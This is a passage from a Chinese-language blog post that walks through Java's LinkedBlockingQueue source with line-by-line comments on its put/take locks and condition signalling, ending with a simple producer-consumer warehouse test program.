class="comment">//以及放完后再唤醒下其他放东西进程的这两种操作</span></div><div class="line"><span class="keyword">private</span> <span class="keyword">final</span> Condition notFull = putLock.newCondition();</div><div class="line"></div><div class="line"><span class="comment">//其实就相当于notEmpty.signal()，用于在放东西完成后调用来唤醒取东西进程，这里</span></div><div class="line"><span class="comment">//专门写成函数只是因为在调用notEmpty.signal()的时候是要进行takeLock的</span></div><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">signalNotEmpty</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">final</span> ReentrantLock takeLock = <span class="keyword">this</span>.takeLock;</div><div class="line">    takeLock.lock();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        notEmpty.signal();</div><div class="line">    &#125; <span class="keyword">finally</span> &#123;</div><div class="line">        takeLock.unlock();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//同理于signalNotEmpty()函数，是在取东西完成后用于唤醒放东西线程用的</span></div><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">signalNotFull</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">final</span> ReentrantLock putLock = <span class="keyword">this</span>.putLock;</div><div class="line">    putLock.lock();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        notFull.signal();</div><div class="line">    &#125; <span class="keyword">finally</span> &#123;</div><div class="line">        putLock.unlock();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//最基础的入队列过程，相信在数据结构里面这种操作已经写过无数遍了，因此此处不再叙述</span></div><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">enqueue</span><span class="params">(Node&lt;E&gt; node)</span> </span>&#123;</div><div class="line">    <span class="comment">// assert putLock.isHeldByCurrentThread();</span></div><div class="line">    <span class="comment">// assert last.next == null;</span></div><div class="line">    last = last.next = node;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//最基础的出队列过程，同样不再叙述细节</span></div><div class="line"><span class="function"><span class="keyword">private</span> E <span class="title">dequeue</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="comment">// assert takeLock.isHeldByCurrentThread();</span></div><div class="line">    <span class="comment">// assert head.item == null;</span></div><div class="line">    Node&lt;E&gt; h = head;</div><div class="line">    Node&lt;E&gt; first = h.next;</div><div class="line">    h.next = h; <span class="comment">// help GC</span></div><div class="line">    head = first;</div><div class="line">    E x = first.item;</div><div class="line">    first.item = <span class="keyword">null</span>;</div><div class="line">    <span class="keyword">return</span> x;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//这个函数比较有意思，是把拿东西取东西两个都禁止掉，适用于一种什么场景呢？</span></div><div class="line"><span class="comment">//在LinkedBlockedQueue类中还提供了链表中的搜索函数————contains()，</span></div><div class="line"><span class="comment">//移除节点函数————remove()，这些函数在执行的时候，出入队列很显然都是不被允许的，</span></div><div class="line"><span class="comment">//因此就需要加上这种锁 </span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">fullyLock</span><span class="params">()</span> </span>&#123;</div><div class="line">    putLock.lock();</div><div class="line">    takeLock.lock();</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//对应上面的fullyLock()函数</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">fullyUnlock</span><span class="params">()</span> </span>&#123;</div><div class="line">    takeLock.unlock();</div><div class="line">    putLock.unlock();</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="LinkedBlockingQueue提供的public接口"><a href="#LinkedBlockingQueue提供的public接口" class="headerlink" title="LinkedBlockingQueue提供的public接口"></a>LinkedBlockingQueue提供的public接口</h3><p>生产者消费者模型中最重要的就是放东西，取东西这两种操作，里面涉及到了wait，notify各种行为，所以我们先来看这两类接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//这是LinkedBlockingQueue中提供的放东西接口，其实放东西取东西的操作都是</span></div><div class="line"><span class="comment">//差不多的，所以我会把这一个叙述的详细点，其他的函数也就触类旁通了</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(E e)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</div><div class="line"><span class="comment">//如果传入的元素是null的话，直接返回空指针异常    </span></div><div class="line">    <span class="keyword">if</span> (e == <span class="keyword">null</span>) <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</div><div class="line"></div><div class="line">  <span class="comment">//这个c命名为-1，是有自己的意义的，之后的函数也都很常见这个c=-1，那么我</span></div><div class="line">    <span class="comment">//就在这里做统一的描述吧。考虑这样一种场景，在try块里面对c赋值的语句（本函数</span></div><div class="line">  <span class="comment">//就是c = count.getAndIncrement();）前面运行出现错误了，也就是不会执行到</span></div><div class="line">  <span class="comment">//对c赋值这个点，那么在if (c == 0) signalNotEmpty();这个语句里就不会唤醒</span></div><div class="line">  <span class="comment">//那些等待取东西的线程，这就是在最开始将c置为-1的意义。另外推荐去自行分析下</span></div><div class="line">  <span class="comment">//public boolean offer(E e, long timeout, TimeUnit unit)这个函数里面</span></div><div class="line">  <span class="comment">//对c赋值为-1的目的场景，是个很有意思的情况。</span></div><div class="line">    <span class="keyword">int</span> c = -<span class="number">1</span>;</div><div class="line">    Node&lt;E&gt; node = <span class="keyword">new</span> Node&lt;E&gt;(e);</div><div class="line">    <span class="keyword">final</span> ReentrantLock putLock = <span class="keyword">this</span>.putLock;</div><div class="line">    <span class="keyword">final</span> AtomicInteger count = <span class="keyword">this</span>.count;</div><div class="line">  <span class="comment">//可以看到开始加放东西锁了，如果成功等到加上了此锁，接下来的过程中就不会再有</span></div><div class="line">  <span class="comment">//放东西的线程同时执行了</span></div><div class="line">    putLock.lockInterruptibly();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="comment">//在count为满时此线程进入等待状态，一直到有拿东西线程从队列中取出来东西</span></div><div class="line">      <span class="comment">//然后唤醒它为止</span></div><div class="line">        <span class="keyword">while</span> (count.get() == capacity) &#123;</div><div class="line">            notFull.await();</div><div class="line">        &#125;</div><div class="line">      <span class="comment">//执行入队列操作</span></div><div class="line">        enqueue(node);</div><div class="line">      <span class="comment">//更新c的值，让c+1</span></div><div class="line">        c = count.getAndIncrement();</div><div class="line">      <span class="comment">//在成功执行完成放东西进程后就是惯例的唤醒操作啦，尽量唤醒各种线程，</span></div><div class="line">      <span class="comment">//如果唤醒的不全或者忘记唤醒的话就很容易造成死锁，本来只是加锁的话wait与</span></div><div class="line">      <span class="comment">//notify操作都是自动Java自动完成的，但如果你自己使用等待、唤醒函数的话，</span></div><div class="line">      <span class="comment">//就要想着自己唤醒了，不想着的话就可能有的线程一直处于wait状态而产生死锁。</span></div><div class="line">      <span class="comment">//这里我们有两个线程会可能产生wait状态，一个拿线程，一个放东西线程，</span></div><div class="line">      <span class="comment">//所以就需要唤醒两次，下面这一次就是为了唤醒放东西线程，</span></div><div class="line">      <span class="comment">//而之后的signalNotEmpty()就是为了唤醒取东西线程</span></div><div class="line">        <span class="keyword">if</span> (c + <span class="number">1</span> &lt; capacity)</div><div class="line">            notFull.signal();</div><div class="line">    &#125;</div><div class="line">  <span class="comment">//使用finally操作的意义就是无论try块是顺序执行还是中途哪里出现异常，</span></div><div class="line">  <span class="comment">//都会执行这里面的解锁操作。</span></div><div class="line">  <span class="keyword">finally</span> &#123;</div><div class="line">        putLock.unlock();</div><div class="line">    &#125;</div><div class="line">  <span class="comment">//唤醒取东西线程</span></div><div class="line">    <span class="keyword">if</span> (c == <span class="number">0</span>)</div><div class="line">        signalNotEmpty();</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//拿东西线程，其实和取东西线程都是大同小异的，我们可以通过这个函数再复习一遍</span></div><div class="line"><span class="comment">//多线程操作的基本结构</span></div><div class="line"><span class="function"><span class="keyword">public</span> E <span class="title">take</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</div><div class="line">  <span class="comment">//首先定义返回值，用于存储取出来的元素</span></div><div class="line">    E x;</div><div class="line">  <span class="comment">//还是c=-1，用于一些特殊场景</span></div><div class="line">    <span class="keyword">int</span> c = -<span class="number">1</span>;</div><div class="line">    <span class="keyword">final</span> AtomicInteger count = <span class="keyword">this</span>.count;</div><div class="line">    <span class="keyword">final</span> ReentrantLock takeLock = <span class="keyword">this</span>.takeLock;</div><div class="line">  <span class="comment">//然后开始正式操作前加锁</span></div><div class="line">    takeLock.lockInterruptibly();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">      <span class="comment">//如果没有东西可取则等待，一直到被唤醒后接着往下运行</span></div><div class="line">        <span class="keyword">while</span> (count.get() == <span class="number">0</span>) &#123;</div><div class="line">            notEmpty.await();</div><div class="line">        &#125;</div><div class="line">      <span class="comment">//进行经典的出队列操作</span></div><div class="line">        x = dequeue();</div><div class="line">        c = count.getAndDecrement();</div><div class="line">      <span class="comment">//然后开始各种唤醒，这里唤醒的是取东西线程</span></div><div class="line">        <span class="keyword">if</span> (c &gt; <span class="number">1</span>)</div><div class="line">            notEmpty.signal();</div><div class="line">    &#125; <span class="keyword">finally</span> &#123;</div><div class="line">    <span class="comment">//解锁操作要放在finally块里面</span></div><div class="line">        takeLock.unlock();</div><div class="line">    &#125;</div><div class="line">  <span class="comment">//这里唤醒的是放东西线程</span></div><div class="line">    <span class="keyword">if</span> (c == capacity)</div><div class="line">        signalNotFull();</div><div class="line">    <span class="keyword">return</span> x;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>然后除了上面两个最常用的存放操作外，LinkedBlockingQueue对象还提供了几个其他的存放操作用于一些特殊的场景</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//也是用于入队列操作，与put不同的如果需要等待的话，就直接返回false，如果</span></div><div class="line"><span class="comment">//不需要等待就可以直接操作的话就进行操作，返回true。</span></div><div class="line"><span class="comment">//但其实仔细分析的话，可以发现在一些场景下仍然可能存在等待时间，</span></div><div class="line"><span class="comment">//满时返回false的操作也并一定都是在if </span></div><div class="line"><span class="comment">//(count.get() == capacity) return false;中完成的，看下面的具体实现分析</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">offer</span><span class="params">(E e)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (e == <span class="keyword">null</span>) <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</div><div class="line">    <span class="keyword">final</span> AtomicInteger count = <span class="keyword">this</span>.count;</div><div class="line">  <span class="comment">//如果满的话，就不进行插入操作，返回false</span></div><div class="line">    <span class="keyword">if</span> (count.get() == capacity)</div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    <span class="keyword">int</span> c = -<span class="number">1</span>;</div><div class="line">    Node&lt;E&gt; node = <span class="keyword">new</span> Node&lt;E&gt;(e);</div><div class="line">  <span class="comment">//这里进行加锁操作，但要注意的是，因为从判断非空到这里的加锁并不是一个原子操作，</span></div><div class="line">  <span class="comment">//中间可能插入各种进程，因此可能刚前面判断还没满可以放东西，到这里就发现有线程</span></div><div class="line">  <span class="comment">//正在处理它而需要等待加锁，所以在这种情况下仍然可能出现等待的时间，只是</span></div><div class="line">  <span class="comment">//可能时间非常短罢了</span></div><div class="line">    <span class="keyword">final</span> ReentrantLock putLock = <span class="keyword">this</span>.putLock;</div><div class="line">    putLock.lock();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">      <span class="comment">//这里可以看到，为了保证我们的函数能够很快的返回操作能不能插入，所以这里</span></div><div class="line">      <span class="comment">//就不用满时候的wait操作，如果满了的话就直接跳过入队列进程。留意一点，如果</span></div><div class="line">      <span class="comment">//没有执行插入操作的话c的值就不会改变，仍然是-1，这点马上我们会用到</span></div><div class="line">        <span class="keyword">if</span> (count.get() &lt; capacity) &#123;</div><div class="line">            enqueue(node);</div><div class="line">            c = count.getAndIncrement();</div><div class="line">            <span class="keyword">if</span> (c + <span class="number">1</span> &lt; capacity)</div><div class="line">                notFull.signal();</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">finally</span> &#123;</div><div class="line">        putLock.unlock();</div><div class="line">    &#125;</div><div class="line">  <span class="comment">//这里是唤醒操作</span></div><div class="line">    <span class="keyword">if</span> (c == <span class="number">0</span>)</div><div class="line">        signalNotEmpty();</div><div class="line">  <span class="comment">//如果执行了入队操作的话这里的c就不会是空，所以返回true，如果没有执行入队操作</span></div><div class="line">  <span class="comment">//的话，这里的c仍然是-1，返回false，也就是我们提到的返回false的第二种情况</span></div><div class="line">    <span class="keyword">return</span> c &gt;= <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//这个函数可以提供等待的上限时间，在等待时间超时的时候就丢弃本次入队操作而返回false</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">offer</span><span class="params">(E e, <span class="keyword">long</span> timeout, TimeUnit unit)</span></span></div><div class="line">    <span class="keyword">throws</span> InterruptedException &#123;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (e == <span class="keyword">null</span>) <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</div><div class="line">  <span class="comment">//将指定的时间长度转换为毫秒来进行处理</span></div><div class="line">    <span class="keyword">long</span> nanos = unit.toNanos(timeout);</div><div class="line">    <span class="keyword">int</span> c = -<span class="number">1</span>;</div><div class="line">    <span class="keyword">final</span> ReentrantLock putLock = <span class="keyword">this</span>.putLock;</div><div class="line">    <span class="keyword">final</span> AtomicInteger count = <span class="keyword">this</span>.count;</div><div class="line">    putLock.lockInterruptibly();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">while</span> (count.get() == capacity) &#123;</div><div class="line">          <span class="comment">//如果等待的剩余时间小于等于0，那么直接返回</span></div><div class="line">            <span class="keyword">if</span> (nanos &lt;= <span class="number">0</span>)</div><div class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">            nanos = notFull.awaitNanos(nanos);</div><div class="line">        &#125;</div><div class="line">        enqueue(<span class="keyword">new</span> Node&lt;E&gt;(e));</div><div class="line">        c = count.getAndIncrement();</div><div class="line">        <span class="keyword">if</span> (c + <span class="number">1</span> &lt; capacity)</div><div class="line">            notFull.signal();</div><div class="line">    &#125; <span class="keyword">finally</span> &#123;</div><div class="line">        putLock.unlock();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (c == <span class="number">0</span>)</div><div class="line">        signalNotEmpty();</div><div class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//下面的这两个函数就是在取函数上的翻版，所以不再详细介绍了</span></div><div class="line"></div><div class="line"><span class="comment">/* 在取操作的时候可以指定等待时间，超过上限的话就丢弃本次操作，返回null */</span></div><div class="line"><span class="function"><span class="keyword">public</span> E <span class="title">poll</span><span class="params">(<span class="keyword">long</span> timeout, TimeUnit unit)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</div><div class="line">    E x = <span class="keyword">null</span>;</div><div class="line">    <span class="keyword">int</span> c = -<span class="number">1</span>;</div><div class="line">    <span class="keyword">long</span> nanos = unit.toNanos(timeout);</div><div class="line">    <span class="keyword">final</span> AtomicInteger count = <span class="keyword">this</span>.count;</div><div class="line">    <span class="keyword">final</span> ReentrantLock takeLock = <span class="keyword">this</span>.takeLock;</div><div class="line">    takeLock.lockInterruptibly();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">while</span> (count.get() == <span class="number">0</span>) &#123;</div><div class="line">            <span class="keyword">if</span> (nanos &lt;= <span class="number">0</span>)</div><div class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">            nanos = notEmpty.awaitNanos(nanos);</div><div class="line">        &#125;</div><div class="line">        x = dequeue();</div><div class="line">        c = count.getAndDecrement();</div><div class="line">        <span class="keyword">if</span> (c &gt; <span class="number">1</span>)</div><div class="line">            notEmpty.signal();</div><div class="line">    &#125; <span class="keyword">finally</span> &#123;</div><div class="line">        takeLock.unlock();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (c == capacity)</div><div class="line">        signalNotFull();</div><div class="line">    <span class="keyword">return</span> x;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* 在取操作的时候看看需不需要等待，如果需要等待的话就丢弃本次操作，返回null */</span></div><div class="line"><span class="function"><span class="keyword">public</span> E <span class="title">poll</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">final</span> AtomicInteger count = <span class="keyword">this</span>.count;</div><div class="line">    <span class="keyword">if</span> (count.get() == <span class="number">0</span>)</div><div class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">    E x = <span class="keyword">null</span>;</div><div class="line">    <span class="keyword">int</span> c = -<span class="number">1</span>;</div><div class="line">    <span class="keyword">final</span> ReentrantLock takeLock = <span class="keyword">this</span>.takeLock;</div><div class="line">    takeLock.lock();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">if</span> (count.get() &gt; <span class="number">0</span>) &#123;</div><div class="line">            x = dequeue();</div><div class="line">            c = count.getAndDecrement();</div><div class="line">            <span class="keyword">if</span> (c &gt; <span class="number">1</span>)</div><div class="line">                notEmpty.signal();</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">finally</span> &#123;</div><div class="line">        takeLock.unlock();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (c == capacity)</div><div class="line">        signalNotFull();</div><div class="line">    <span class="keyword">return</span> x;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>LinkedBlockingQueue提供的搜索函数，移除函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//这两个函数都比较简单，所以不做具体实现分析，只阐述个大概吧</span></div><div class="line"><span class="comment">//首先因为搜索与移除都是要对整个链表进行的遍历操作，因此在锁上是要把</span></div><div class="line"><span class="comment">//入队锁出队锁都加上的，这时候就禁止了任何涉及到对队列修改的操作了</span></div><div class="line"></div><div class="line"><span class="comment">//然后因为在执行的时候已经加上锁了就只有这一个线程对队列进行操作，所以</span></div><div class="line"><span class="comment">//不会有竞争，也就不需要等待、唤醒之类的操作</span></div><div class="line"></div><div class="line"><span class="comment">//之后就是简单的对链表进行遍历的操作了</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">remove</span><span class="params">(Object o)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (o == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    fullyLock();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">for</span> (Node&lt;E&gt; trail = head, p = trail.next;</div><div class="line">             p != <span class="keyword">null</span>;</div><div class="line">             trail = p, p = p.next) &#123;</div><div class="line">            <span class="keyword">if</span> (o.equals(p.item)) &#123;</div><div class="line">                unlink(p, trail);</div><div class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125; <span class="keyword">finally</span> &#123;</div><div class="line">        fullyUnlock();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(Object o)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (o == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    fullyLock();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">for</span> (Node&lt;E&gt; p = head.next; p != <span class="keyword">null</span>; p = p.next)</div><div class="line">            <span class="keyword">if</span> (o.equals(p.item))</div><div class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125; <span class="keyword">finally</span> &#123;</div><div class="line">        fullyUnlock();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="一个简单的测试"><a href="#一个简单的测试" class="headerlink" title="一个简单的测试"></a>一个简单的测试</h2><p>我们模仿下库房的出库与入库操作吧：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.util.concurrent.LinkedBlockingQueue;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedBlockingQueueTest</span> </span>&#123;</div><div class="line">  <span class="comment">//我们的队列linkedBLockingQueue，使用阻塞队列对象</span></div><div class="line"><span class="keyword">private</span> LinkedBlockingQueue&lt;String&gt; linkedBlockingQueue;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="title">LinkedBlockingQueueTest</span><span class="params">()</span> </span>&#123;</div><div class="line">linkedBlockingQueue = <span class="keyword">new</span> LinkedBlockingQueue&lt;String&gt;();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//一个从库房中拿东西的内部类，我们设置其每1s从传动带上拿一次东西</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">BuyThread</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</div><div class="line"></div><div class="line"><span class="meta">@Override</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</div><div class="line">String thing;</div><div class="line"><span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</div><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">thing = linkedBlockingQueue.take();</div><div class="line">System.out.println(<span class="string">"取出了"</span> + thing);</div><div class="line">sleep(<span class="number">1000</span>);</div><div class="line">&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</div><div class="line"><span class="comment">// TODO Auto-generated catch block</span></div><div class="line">e.printStackTrace();</div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//一个往库房中放东西的内部类，我们设置其每0.5s往里面放一个东西</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">PutThread</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</div><div class="line"></div><div class="line"><span class="meta">@Override</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</div><div class="line"><span class="keyword">int</span> thing = <span class="number">1</span>;</div><div class="line"><span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</div><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">linkedBlockingQueue.put(Integer.toString(thing));</div><div class="line">System.out.println(<span class="string">"放入了"</span> + thing);</div><div class="line">                  thing += <span class="number">1</span>;</div><div class="line">sleep(<span class="number">500</span>);</div><div class="line">&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</div><div class="line">e.printStackTrace();</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//main函数里开始执行，首先初始化这个对象，然后分别开启取线程与拿线程</span></div><div class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line">LinkedBlockingQueueTest linkedBlockingQueueTest = <span class="keyword">new</span> LinkedBlockingQueueTest();</div><div class="line">linkedBlockingQueueTest.new BuyThread().start();</div><div class="line">linkedBlockingQueueTest.new PutThread().start();</div><div class="line">&#125;</div><div class="line">  </div><div 